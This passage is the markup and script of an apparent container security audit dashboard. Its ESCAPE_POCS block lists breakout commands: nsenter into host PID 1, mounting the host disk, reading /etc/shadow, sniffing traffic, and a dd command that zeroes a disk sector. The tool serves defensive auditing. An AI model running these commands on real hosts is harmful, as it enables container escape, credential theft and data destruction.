                            <path d="M12,17A2,2 0 0,0 14,15C14,14.21 13.54,13.53 12.88,13.22V10H11.12V13.22C10.46,13.53 10,14.21 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6C4.89,22 4,21.1 4,20V10C4,8.89 4.89,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z" />
                        </svg>
                    </div>
                    <div class="welcome-card-title">Namespace Security</div>
                    <div class="welcome-card-desc">Validates if Mount, IPC, PID, User, and Net namespaces are securely isolated or shared with the host system.</div>
                </div>
                <div class="welcome-card">
                    <div class="welcome-card-icon">
                        <svg viewBox="0 0 24 24">
                            <path d="M19,3H5C3.89,3 3,3.89 3,5V19C3,20.1 3.89,21 5,21H19C20.1,21 21,20.1 21,19V5C21,3.89 20.1,3 19,3M19,19H5V5H19V19M17,17H7V15H17V17M17,13H7V11H17V13M17,9H7V7H17V9Z" />
                        </svg>
                    </div>
                    <div class="welcome-card-title">Privilege & Hardening</div>
                    <div class="welcome-card-desc">Inspects Linux Capabilities (bounding and effective sets), LSM settings (AppArmor/SELinux), Seccomp modes, and Cgroup limits.</div>
                </div>
            </div>
        </div>

        <!-- Loading State -->
        <div class="loading-container" id="loading-screen">
            <div class="scanning-loader">
                <div class="scanning-loader-ring"></div>
                <div class="scanning-loader-ring"></div>
                <div class="scanning-loader-ring"></div>
                <div class="scanning-shield">
                    <svg viewBox="0 0 24 24">
                        <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,11.8V19.93C8.61,18.73 6.13,15.18 6.02,11H12V11.8M12,11V4.8L18,7.5V11H12M12,11H18C17.89,15.18 15.39,18.73 12,19.93V11.8H12" />
                    </svg>
                </div>
            </div>
            <h2 class="loading-title">Scanning Process Context</h2>
            <div class="loading-subtitle">Inspecting namespaces, capabilities, sockets and active mounts...</div>
        </div>

        <!-- Error State -->
        <div class="error-container" id="error-screen">
            <div class="error-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M13,14H11V10H13M13,18H11V16H13M1,21H23L12,2L1,21Z" />
                </svg>
            </div>
            <h2 class="error-title">Audit Failed</h2>
            <p class="error-desc" id="error-message">Failed to access process PID details. Insufficient permissions or process terminated.</p>
        </div>

        <!-- Active Report Section -->
        <div class="report-wrapper" id="report-wrapper">
            
            <!-- Report Title & Quick Actions -->
            <div class="report-header">
                <div class="report-meta-info">
                    <div class="report-pid-row">
                        <h2 class="report-target-title" id="report-target-name">docker-contain-process</h2>
                        <span class="report-pid-badge" id="report-target-pid">PID 12844</span>
                    </div>
                    <div class="report-cmdline-wrapper">
                        <span class="report-cmdline-label">CMD:</span>
                        <div class="report-cmdline" id="report-target-cmdline">/usr/bin/nginx -g daemon off;</div>
                    </div>
                </div>
                <div class="report-actions">
                    <button class="btn-export" id="export-json-btn">
                        <svg viewBox="0 0 24 24"><path d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/></svg>
                        Export JSON
                    </button>
                    <button class="btn-export" id="export-html-btn">
                        <svg viewBox="0 0 24 24"><path d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/></svg>
                        Export HTML
                    </button>
                    <button class="btn-export primary" id="export-pdf-btn">
                        <svg viewBox="0 0 24 24"><path d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/></svg>
                        Export PDF
                    </button>
                </div>
            </div>

            <!-- Tabs Selection -->
            <div class="tabs-header">
                <button class="tab-btn active" data-tab="tab-overview">
                    <svg viewBox="0 0 24 24"><path d="M12,3L2,12H5V20H19V12H22L12,3M12,7.7C14.1,7.7 15.8,9.4 15.8,11.5C15.8,14.5 12,18 12,18C12,18 8.2,14.5 8.2,11.5C8.2,9.4 9.9,7.7 12,7.7M12,10A1.5,1.5 0 0,0 10.5,11.5A1.5,1.5 0 0,0 12,13A1.5,1.5 0 0,0 13.5,11.5A1.5,1.5 0 0,0 12,10Z"/></svg>
                    Overview
                </button>
                <button class="tab-btn" data-tab="tab-namespaces">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.53c-.26-.81-1-1.4-1.9-1.4h-1v-3c0-.55-.45-1-1-1h-6v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg>
                    Namespaces
                </button>
                <button class="tab-btn" data-tab="tab-capabilities">
                    <svg viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6A6,6 0 0,0 6,12A6,6 0 0,0 12,18A6,6 0 0,0 18,12A6,6 0 0,0 12,6M12,8A4,4 0 0,1 16,12A4,4 0 0,1 12,16A4,4 0 0,1 8,12A4,4 0 0,1 12,8Z"/></svg>
                    Capabilities
                </button>
                <button class="tab-btn" data-tab="tab-mounts">
                    <svg viewBox="0 0 24 24"><path d="M12,2C15.31,2 18,4.66 18,7.95C18,12.41 12,19 12,19C12,19 6,12.41 6,7.95C6,4.66 8.69,2 12,2M12,6A2,2 0 0,0 10,8A2,2 0 0,0 12,10A2,2 0 0,0 14,8A2,2 0 0,0 12,6M20,21C20,21.55 19.55,22 19,22H5C4.45,22 4,21.55 4,21V20H20V21Z"/></svg>
                    Mounts
                </button>
                <button class="tab-btn" data-tab="tab-security">
                    <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,11.8V19.93C8.61,18.73 6.13,15.18 6.02,11H12V11.8M12,11V4.8L18,7.5V11H12M12,11H18C17.89,15.18 15.39,18.73 12,19.93V11.8H12" /></svg>
                    Security & LSM
                </button>
                <button class="tab-btn" data-tab="tab-network">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.53c-.26-.81-1-1.4-1.9-1.4h-1v-3c0-.55-.45-1-1-1h-6v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg>
                    Network
                </button>
                <button class="tab-btn" data-tab="tab-filesystem">
                    <svg viewBox="0 0 24 24"><path d="M20,6H12L10,4H4C2.9,4 2,4.9 2,6V18C2,19.1 2.9,20 4,20H20C21.1,20 22,19.1 22,18V8C22,6.9 21.1,6 20,6M20,18H4V8H20V18Z"/></svg>
                    Filesystem & FDs
                </button>
                <button class="tab-btn" data-tab="tab-environment">
                    <svg viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6A6,6 0 0,0 6,12A6,6 0 0,0 12,18A6,6 0 0,0 18,12A6,6 0 0,0 12,6M12,8A4,4 0 0,1 16,12A4,4 0 0,1 12,16A4,4 0 0,1 8,12A4,4 0 0,1 12,8Z"/></svg>
                    Secrets
                </button>
            </div>

            <!-- Scrollable Reports -->
            <div class="report-scroll-content">
                
                <!-- Tab: Overview -->
                <div class="tab-content active" id="tab-overview">
                    <div class="report-row-top">
                        
                        <!-- Circular Score Gauge Card -->
                        <div class="score-card">
                            <div class="score-gauge" id="score-gauge-ring">
                                <svg viewBox="0 0 140 140">
                                    <circle class="track" cx="70" cy="70" r="65"></circle>
                                    <circle class="fill" cx="70" cy="70" r="65" id="score-ring-fill"></circle>
                                </svg>
                                <div class="score-value">
                                    <span class="score-number" id="score-value-num">85</span>
                                    <span class="score-max">/100</span>
                                </div>
                            </div>
                            <h3 class="score-label">Audit Score</h3>
                            <span class="score-status" id="score-safety-status">SECURE</span>
                        </div>

                        <!-- Grid Summary Cards -->
                        <div class="summary-dashboard">
                            
                            <div class="metric-widget">
                                <div class="metric-label-row">
                                    <span class="metric-label">Namespaces</span>
                                    <div class="metric-icon">
                                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.53c-.26-.81-1-1.4-1.9-1.4h-1v-3c0-.55-.45-1-1-1h-6v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg>
                                    </div>
                                </div>
                                <div class="metric-value-row">
                                    <span class="metric-value" id="metric-ns-score">100</span>
                                    <span class="metric-status success" id="metric-ns-status">Isolated</span>
                                </div>
                            </div>

                            <div class="metric-widget">
                                <div class="metric-label-row">
                                    <span class="metric-label">Capabilities</span>
                                    <div class="metric-icon">
                                        <svg viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6A6,6 0 0,0 6,12A6,6 0 0,0 12,18A6,6 0 0,0 18,12A6,6 0 0,0 12,6M12,8A4,4 0 0,1 16,12A4,4 0 0,1 12,16A4,4 0 0,1 8,12A4,4 0 0,1 12,8Z"/></svg>
                                    </div>
                                </div>
                                <div class="metric-value-row">
                                    <span class="metric-value" id="metric-cap-count">0</span>
                                    <span class="metric-status success" id="metric-cap-status">Safe</span>
                                </div>
                            </div>

                            <div class="metric-widget">
                                <div class="metric-label-row">
                                    <span class="metric-label">User Context</span>
                                    <div class="metric-icon">
                                        <svg viewBox="0 0 24 24"><path d="M12,4A4,4 0 0,1 16,8A4,4 0 0,1 12,12A4,4 0 0,1 8,8A4,4 0 0,1 12,4M12,14C16.42,14 20,15.79 20,18V20H4V18C4,15.79 7.58,14 12,14Z"/></svg>
                                    </div>
                                </div>
                                <div class="metric-value-row">
                                    <span class="metric-value" id="metric-user-uid">UID 0</span>
                                    <span class="metric-status warning" id="metric-user-status">Root</span>
                                </div>
                            </div>

                            <div class="metric-widget">
                                <div class="metric-label-row">
                                    <span class="metric-label">Exposures</span>
                                    <div class="metric-icon">
                                        <svg viewBox="0 0 24 24"><path d="M13,14H11V10H13M13,18H11V16H13M1,21H23L12,2L1,21Z"/></svg>
                                    </div>
                                </div>
                                <div class="metric-value-row">
                                    <span class="metric-value" id="metric-risks-count">2</span>
                                    <span class="metric-status danger" id="metric-risks-status">Risks</span>
                                </div>
                            </div>

                        </div>
                    </div>

                    <!-- Remediation Actions Card -->
                    <div class="section-card" style="margin-top: 1.5rem;">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                                Recommended Hardening Actions
                            </div>
                        </div>
                        <div class="recs-container" id="overview-recs-list">
                            <!-- Populated dynamically -->
                        </div>
                    </div>
                </div>

                <!-- Tab: Namespaces -->
                <div class="tab-content" id="tab-namespaces">
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.53c-.26-.81-1-1.4-1.9-1.4h-1v-3c0-.55-.45-1-1-1h-6v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg>
                                Linux Namespace Isolation
                            </div>
                            <span class="risk-badge info" id="ns-score-badge">SCORE: 100/100</span>
                        </div>
                        <div class="namespaces-grid" id="namespaces-list">
                            <!-- Populated dynamically -->
                        </div>
                    </div>
                </div>

                <!-- Tab: Capabilities -->
                <div class="tab-content" id="tab-capabilities">
                    
                    <!-- High-risk Capabilities -->
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12,2L1,21H23L12,2M12,6L19.8,19H4.2L12,6M11,10V14H13V10H11M11,16V18H13V16H11Z"/></svg>
                                Sensitive Capabilities Active
                            </div>
                            <span class="risk-badge info" id="cap-score-badge">SCORE: 100/100</span>
                        </div>
                        <div class="data-table-wrapper">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th style="width: 250px;">Capability</th>
                                        <th style="width: 120px;">Risk Level</th>
                                        <th>Security Impact Description</th>
                                    </tr>
                                </thead>
                                <tbody id="high-risk-caps-list">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>

                    <!-- Complete Capability Sets -->
                    <div class="caps-grid">
                        <div class="cap-set-card">
                            <h4 class="cap-set-title">Effective Set (Permitted active)</h4>
                            <div class="cap-list-tags" id="cap-effective-set">
                                <!-- Populated dynamically -->
                            </div>
                        </div>
                        <div class="cap-set-card">
                            <h4 class="cap-set-title">Bounding Set (Max privileges)</h4>
                            <div class="cap-list-tags" id="cap-bounding-set">
                                <!-- Populated dynamically -->
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Tab: Mounts -->
                <div class="tab-content" id="tab-mounts">
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M19 15v4H5v-4H3v4c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-4h-2zM13 12.17l2.59-2.59L17 11l-5 5-5-5 1.41-1.42L11 12.17V3h2v9.17z"/></svg>
                                Dangerous Mount Points / Volume Exposures
                            </div>
                            <span class="risk-badge info" id="mounts-score-badge">SCORE: 100/100</span>
                        </div>
                        <div class="data-table-wrapper" style="margin-bottom: 1.5rem;">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th>Target Mount Point</th>
                                        <th>Source Host Path</th>
                                        <th style="width: 100px;">FS Type</th>
                                        <th style="width: 110px;">Severity</th>
                                        <th>Risk Context</th>
                                    </tr>
                                </thead>
                                <tbody id="mount-risks-list">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                    
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12,2C15.31,2 18,4.66 18,7.95C18,12.41 12,19 12,19C12,19 6,12.41 6,7.95C6,4.66 8.69,2 12,2M12,6A2,2 0 0,0 10,8A2,2 0 0,0 12,10A2,2 0 0,0 14,8A2,2 0 0,0 12,6M20,21C20,21.55 19.55,22 19,22H5C4.45,22 4,21.55 4,21V20H20V21Z"/></svg>
                                Full Mountpoints Table
                            </div>
                        </div>
                        <div class="data-table-wrapper" style="max-height: 350px; overflow-y: auto;">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th style="width: 80px;">Mount ID</th>
                                        <th>Mount Point</th>
                                        <th>Source File/Device</th>
                                        <th>Filesystem</th>
                                        <th>Flags</th>
                                    </tr>
                                </thead>
                                <tbody id="full-mounts-list">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- Tab: Security -->
                <div class="tab-content" id="tab-security">
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,11.8V19.93C8.61,18.73 6.13,15.18 6.02,11H12V11.8M12,11V4.8L18,7.5V11H12M12,11H18C17.89,15.18 15.39,18.73 12,19.93V11.8H12" /></svg>
                                Process Security Sandbox Parameters
                            </div>
                            <span class="risk-badge info" id="sec-score-badge">SCORE: 100/100</span>
                        </div>
                        <div class="data-table-wrapper">
                            <table class="data-table">
                                <tbody>
                                    <tr>
                                        <th style="width: 250px;">Real User ID (UID)</th>
                                        <td id="sec-uid">0 (root)</td>
                                    </tr>
                                    <tr>
                                        <th>Effective User ID (EUID)</th>
                                        <td id="sec-euid">0 (root)</td>
                                    </tr>
                                    <tr>
                                        <th>Group ID (GID) / EGID</th>
                                        <td id="sec-gid">0 / 0</td>
                                    </tr>
                                    <tr>
                                        <th>LSM (Linux Security Module) Profile</th>
                                        <td id="sec-lsm">docker-default (AppArmor)</td>
                                    </tr>
                                    <tr>
                                        <th>Seccomp Syscall Filtering</th>
                                        <td id="sec-seccomp">Enabled (Filter mode 2)</td>
                                    </tr>
                                    <tr>
                                        <th>NoNewPrivs (No SUID elevation)</th>
                                        <td id="sec-nnp">Enabled (true)</td>
                                    </tr>
                                    <tr>
                                        <th>User Namespace Mappings (Rootless)</th>
                                        <td id="sec-userns">Disabled (Mapped directly to host Root)</td>
                                    </tr>
                                    <tr>
                                        <th>Cgroup Process Memory Limit</th>
                                        <td id="sec-cgroup-mem">None (Unlimited)</td>
                                    </tr>
                                    <tr>
                                        <th>Cgroup Process Count Limit (PIDs)</th>
                                        <td id="sec-cgroup-pids">None (Unlimited)</td>
                                    </tr>
                                    <tr>
                                        <th>PID 1 Init System inside Namespace</th>
                                        <td id="sec-init-name">tini</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- Tab: Network -->
                <div class="tab-content" id="tab-network">
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.53c-.26-.81-1-1.4-1.9-1.4h-1v-3c0-.55-.45-1-1-1h-6v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg>
                                Inner-Namespace Listening Ports
                            </div>
                        </div>
                        <div class="data-table-wrapper" style="margin-bottom: 1.5rem;">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th style="width: 120px;">Protocol</th>
                                        <th>Local Bind IP Address</th>
                                        <th>Port</th>
                                        <th>Exposed Status</th>
                                    </tr>
                                </thead>
                                <tbody id="net-listening-ports">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>

                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12,2C6.47,2 2,6.5 2,12C2,17.5 6.47,22 12,22C17.5,22 22,17.5 22,12C22,6.5 17.5,2 12,2M12,4A8,8 0 0,1 20,12C20,13.62 19.5,15.14 18.69,16.42L15,12.7V9A3,3 0 0,0 12,6V4M12,18A6,6 0 0,1 6,12C6,9.45 7.59,7.27 9.84,6.4L7,9.24V11H9V13H11V15H13V17L12,18.06V20" /></svg>
                                Active Connections Table
                            </div>
                        </div>
                        <div class="data-table-wrapper">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th style="width: 120px;">Protocol</th>
                                        <th>Local Address</th>
                                        <th>Remote Address</th>
                                        <th>Connection State</th>
                                    </tr>
                                </thead>
                                <tbody id="net-connections-list">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- Tab: Filesystem & FDs -->
                <div class="tab-content" id="tab-filesystem">
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm0 12H4V6h5.17l2 2H20v10z"/></svg>
                                Insecure File Permissions & SUID Files
                            </div>
                            <span class="risk-badge info" id="fs-score-badge">SCORE: 100/100</span>
                        </div>
                        <div class="data-table-wrapper">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th>Target Path</th>
                                        <th style="width: 120px;">Risk Level</th>
                                        <th>Security Violation Context</th>
                                    </tr>
                                </thead>
                                <tbody id="fs-risks-list">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>

                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
                                Open File Descriptor Risks (Leak Scan)
                            </div>
                            <span class="risk-badge info" id="fd-score-badge">SCORE: 100/100</span>
                        </div>
                        <div class="data-table-wrapper">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th style="width: 80px;">FD</th>
                                        <th style="width: 120px;">Type</th>
                                        <th>Target Path / Connection</th>
                                        <th style="width: 110px;">Security Risk</th>
                                        <th>Risk Context</th>
                                    </tr>
                                </thead>
                                <tbody id="fd-leak-list">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- Tab: Environment Secrets -->
                <div class="tab-content" id="tab-environment">
                    <div class="section-card">
                        <div class="section-card-title">
                            <div class="section-card-title-text">
                                <svg viewBox="0 0 24 24"><path d="M12,17A2,2 0 0,0 14,15C14,14.21 13.54,13.53 12.88,13.22V10H11.12V13.22C10.46,13.53 10,14.21 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6C4.89,22 4,21.1 4,20V10C4,8.89 4.89,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z" /></svg>
                                Exposed Environment Variables & Secrets
                            </div>
                            <span class="risk-badge info" id="env-score-badge">SCORE: 100/100</span>
                        </div>
                        <div class="data-table-wrapper">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th style="width: 250px;">Variable Name</th>
                                        <th>Value</th>
                                    </tr>
                                </thead>
                                <tbody id="env-secrets-list">
                                    <!-- Populated dynamically -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

            </div>
        </div>

    </div>

    </div>

    <!-- MODAL FOR ESCAPE POCS -->
    <div id="poc-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(3, 7, 18, 0.85); backdrop-filter: blur(10px); z-index: 9999; align-items: center; justify-content: center;">
        <div style="background: var(--bg-sidebar); border: 1px solid var(--color-primary); border-radius: 16px; width: 90%; max-width: 650px; padding: 2rem; box-shadow: 0 0 30px rgba(59, 130, 246, 0.2); position: relative; max-height: 90vh; overflow-y: auto;">
            <button id="poc-modal-close" style="position: absolute; top: 1.25rem; right: 1.25rem; background: transparent; border: none; color: var(--text-secondary); cursor: pointer; font-size: 1.5rem; transition: color 0.2s;" onclick="closePoCModal()">&times;</button>
            <div style="display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem;">
                <div style="width: 32px; height: 32px; background-color: var(--color-danger-glow); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; display: flex; align-items: center; justify-content: center;">
                    <svg style="width: 18px; height: 18px; fill: var(--color-danger);" viewBox="0 0 24 24">
                        <path d="M12,2L1,21H23L12,2M12,6L19.8,19H4.2L12,6M11,10V14H13V10H11M11,16V18H13V16H11Z"/>
                    </svg>
                </div>
                <h2 style="font-family: var(--font-display); font-size: 1.4rem; font-weight: 700; color: #fff;" id="poc-modal-title">Escape PoC</h2>
            </div>
            
            <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.5; margin-bottom: 1.5rem;" id="poc-modal-desc"></p>
            
            <div style="background-color: rgba(239, 68, 68, 0.08); border-left: 4px solid var(--color-danger); padding: 0.75rem 1rem; border-radius: 4px; margin-bottom: 1.5rem;">
                <span style="font-size: 0.75rem; font-weight: 700; color: var(--color-danger); text-transform: uppercase; letter-spacing: 0.05em; display: block; margin-bottom: 0.25rem;">⚠️ Security Warning</span>
                <span style="font-size: 0.8rem; color: var(--text-secondary); line-height: 1.4; display: block;">This Proof of Concept (PoC) walkthrough is for authorized security auditing and educational purposes only. Run these commands from a shell inside the container to demonstrate the breakout risk.</span>
            </div>

            <div style="position: relative; background-color: #020617; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; margin-bottom: 1.5rem;">
                <div style="display: flex; justify-content: space-between; align-items: center; background-color: rgba(255,255,255,0.02); padding: 0.5rem 1rem; border-bottom: 1px solid var(--border-color);">
                    <span style="font-size: 0.7rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em;">PoC Breakout Script</span>
                    <button id="poc-copy-btn" style="background: transparent; border: none; color: var(--color-primary); cursor: pointer; font-size: 0.75rem; font-weight: 600; padding: 0.2rem 0.5rem;" onclick="copyPoC()"></button>
                </div>
                <pre style="padding: 1.25rem; font-family: var(--font-mono); font-size: 0.8rem; line-height: 1.5; overflow-x: auto; color: #a5f3fc; margin: 0;" id="poc-modal-code"></pre>
            </div>
            
            <div style="display: flex; justify-content: flex-end;">
                <button style="background-color: rgba(255, 255, 255, 0.05); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px; padding: 0.5rem 1.25rem; font-family: var(--font-display); font-weight: 600; font-size: 0.85rem; cursor: pointer; transition: all 0.2s;" onclick="closePoCModal()">Close</button>
            </div>
        </div>
    </div>

    <!-- Hidden Printable template for PDF generation -->
    <div id="pdf-template-container">
        <!-- Rendered completely into multi-page layout dynamically -->
    </div>

    <!-- SCRIPT LOGIC -->
    <script>
        let currentReportData = null;

        const ESCAPE_POCS = {
            'mnt': {
                title: 'Mount Namespace Escape',
                desc: 'The container shares the host mount namespace. A privileged container can modify host mount tables or write directly to host filesystems.',
                poc: '# Since the mount namespace is shared, you can see all host mounts.\n# To see host disks and mount them:\nfdisk -l\n\n# Mount the host drive:\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host'
            },
            'pid': {
                title: 'PID Namespace Escape (nsenter breakout)',
                desc: 'Sharing the PID namespace allows the container to see and trace host processes, including host PID 1 (systemd init).',
                poc: '# 1. Verify you can see host processes:\nps aux\n\n# 2. Break out to host shell by entering host namespaces of PID 1:\nnsenter --target 1 --mount --uts --ipc --net --pid /bin/bash'
            },
            'net': {
                title: 'Network Namespace Exposure',
                desc: 'Sharing the network namespace with the host allows the container to view all host network interfaces, sniff host traffic, and bind to host ports directly.',
                poc: '# 1. List host interfaces:\nip addr\n\n# 2. Sniff host network traffic (if tcpdump is installed):\ntcpdump -i any\n\n# 3. Listen on host port 80:\ncurl -s --unix-socket /var/run/docker.sock http://localhost/'
            },
            'ipc': {
                title: 'IPC Shared Memory Manipulation',
                desc: 'Sharing the IPC namespace allows the container to read/write to the host shared memory segments, message queues, and semaphores.',
                poc: '# 1. List host shared memory segments:\nipcs -m\n\n# 2. Attach or read segments if permissions allow.'
            },
            'uts': {
                title: 'UTS (Hostname) Escape',
                desc: 'Sharing UTS namespace allows the container to change the hostname of the host machine, disrupting local network identification.',
                poc: '# Change the hostname of the host machine:\nhostname attacker-controlled-node\n\n# Check the hostname has updated on the host:\nhostname'
            },
            'user': {
                title: 'User Namespace Shared (No virtualization)',
                desc: 'Sharing the user namespace means root inside the container maps to root on the host. If any breakout occurs, the attacker has instant host root privileges.',
                poc: '# Root inside container = Root on host.\n# Check your active user privileges:\nid'
            },
            'cgroup': {
                title: 'Cgroup Namespace Leak',
                desc: 'Leaks directory layout of cgroups, helping attackers map the host system or orchestrator configuration.',
                poc: '# View the host cgroup tree paths:\ncat /proc/self/cgroup'
            },
            'CAP_SYS_ADMIN': {
                title: 'CAP_SYS_ADMIN Breakout (Disk Mount)',
                desc: 'CAP_SYS_ADMIN is the most powerful Linux capability. It allows mounting filesystems, modifying kernel configurations, and breaking isolation.',
                poc: '# 1. Check active capabilities (verify CAP_SYS_ADMIN is present):\ncapsh --print\n\n# 2. List host block devices:\nfdisk -l\n\n# 3. Mount host root partition:\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\n\n# 4. Access host filesystem files:\ncat /mnt/host/etc/shadow'
            },
            'CAP_SYS_RAWIO': {
                title: 'CAP_SYS_RAWIO Port I/O and Disk Write',
                desc: 'Allows raw access to I/O ports, physical memory (/dev/mem), and raw disk sector writes, bypassing the filesystem.',
                poc: '# 1. Write or read raw physical memory (if /dev/mem is accessible):\ndd if=/dev/mem bs=1k count=10 | hexdump -C\n\n# 2. Bypassing filesystem to write directly to block device sector:\ndd if=/dev/zero of=/dev/sda bs=512 count=1'
            },
            'CAP_SYS_PTRACE': {
